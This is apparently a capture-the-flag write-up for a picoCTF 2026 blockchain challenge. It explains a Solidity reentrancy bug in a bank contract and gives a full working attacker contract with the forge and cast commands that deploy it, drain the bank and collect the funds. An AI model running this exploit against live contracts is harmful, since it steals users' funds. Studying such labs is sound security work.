# Reentrance - picoCTF 2026

**Category:** Blockchain
**Points:** 400

## Challenge Description

The lead developer at SecureBank Corp is back, and he's doubling down. After the last "incident," he rebuilt the system. Classic reentrancy vulnerability in Solidity smart contract.

## Approach

This challenge presents a classic **reentrancy vulnerability** in a Solidity smart contract. The vulnerable contract (SecureBank) has a `withdraw()` function that sends Ether to the caller **before** updating the internal balance state. This means an attacker contract can recursively call `withdraw()` from its `receive()` or `fallback()` function, draining the contract's funds before the balance is ever set to zero.

### The Vulnerability

The typical vulnerable pattern looks like this:

```solidity
function withdraw() public {
    uint256 balance = balances[msg.sender];
    require(balance > 0, "Insufficient balance");

    // BUG: Sends ETH before updating state
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Transfer failed");

    // State update happens AFTER the external call
    balances[msg.sender] = 0;
}
```

When `msg.sender` is a contract with a `receive()` function, that function executes when ETH is received. If the `receive()` function calls `withdraw()` again, the balance check still passes because `balances[msg.sender]` has not been zeroed yet. This creates a recursive loop that drains the contract.

### Attack Flow

1. Attacker deposits a small amount of ETH into SecureBank
2. Attacker calls `withdraw()`
3. SecureBank sends ETH to attacker contract, triggering `receive()`
4. Inside `receive()`, attacker calls `withdraw()` again
5. SecureBank checks balance -- still shows the original deposit (not yet zeroed)
6. SecureBank sends ETH again, triggering another `receive()`
7. This repeats until the contract is drained or gas runs out
8. Once the challenge detects the contract balance is zero (or below a threshold), the flag is revealed

### Tools Used

- **Foundry** (`cast` and `forge`): For interacting with the deployed contract on the challenge's RPC endpoint
- **Solidity**: For writing the attacker contract
- **Python (web3.py)**: For orchestrating the attack programmatically

## Solution

### Step 1: Reconnaissance

Connect to the challenge instance and note:
- The RPC URL provided
- The SecureBank contract address
- Your player private key and address
- The setup/flag contract address (if provided separately)

Use `cast` to inspect the contract:

```bash
cast balance <SECUREBANK_ADDRESS> --rpc-url <RPC_URL>
cast call <SECUREBANK_ADDRESS> "balances(address)(uint256)" <YOUR_ADDRESS> --rpc-url <RPC_URL>
```

### Step 2: Deploy the Attacker Contract

Create an attacker contract that:
1. Deposits ETH into SecureBank
2. Calls withdraw
3. Re-enters withdraw from its receive() function

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISecureBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    ISecureBank public target;
    address public owner;

    constructor(address _target) {
        target = ISecureBank(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Send some ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    function collectLoot() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
```

### Step 3: Execute the Attack

```bash
# Deploy the attacker contract
forge create Attacker --constructor-args <SECUREBANK_ADDRESS> \
    --private-key <PRIVATE_KEY> --rpc-url <RPC_URL>

# Fund and execute the attack (deposit + recursive withdraw)
cast send <ATTACKER_ADDRESS> "attack()" --value 0.001ether \
    --private-key <PRIVATE_KEY> --rpc-url <RPC_URL>

# Verify the bank is drained
cast balance <SECUREBANK_ADDRESS> --rpc-url <RPC_URL>

# Collect drained funds
cast send <ATTACKER_ADDRESS> "collectLoot()" \
    --private-key <PRIVATE_KEY> --rpc-url <RPC_URL>
```

### Step 4: Retrieve the Flag

After draining the contract, call the `isSolved()` or equivalent function on the setup contract, or the flag may be printed by the challenge infrastructure once it detects the bank is drained.

```bash
cast call <SETUP_ADDRESS> "isSolved()(bool)" --rpc-url <RPC_URL>
```

## Solution Script

```
python3 solve.py
```

## Flag

```
picoCTF{...}  (placeholder - actual flag varies per instance)
```
